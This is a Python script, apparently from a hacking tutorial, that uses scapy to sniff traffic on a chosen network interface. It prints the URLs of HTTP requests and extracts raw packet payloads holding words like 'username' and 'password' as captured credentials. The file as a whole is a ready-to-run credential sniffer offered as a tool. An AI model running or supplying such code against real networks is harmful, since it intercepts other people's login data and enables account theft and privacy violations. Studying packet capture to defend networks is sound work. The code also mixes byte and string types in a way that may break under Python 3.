import scapy.all as scapy
from scapy.layers import http # import module for filtering http requests
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--iface",dest="interface",help="Specify interface to sniff data")
    value = parser.parse_args()
    if not value.interface:
        print("[-]Specify an interface")
    else:
        return value       
    
#this method sniffs data on given interface , prn is for callback function and store = False indicates not to store in memory
def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed)

#this method captures the http requests "host" is the domain and "path" is the resource or web page 
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

#this method captures post requests/login information
def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords=["username","login","email","user","password","pass"]
        for keyword in keywords:
            if keyword in load:
                return load

#this method is a call back function for scapy.sniff and it processes the packet captured
def process_sniffed(packet):   
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+]Captured HTTP Request :"+url)

    credentials =get_credentials(packet)
    if credentials:
        print("\n[+]Captured Credentials :"+credentials+"\n")    
       
value = get_arguments()
sniff(value.interface)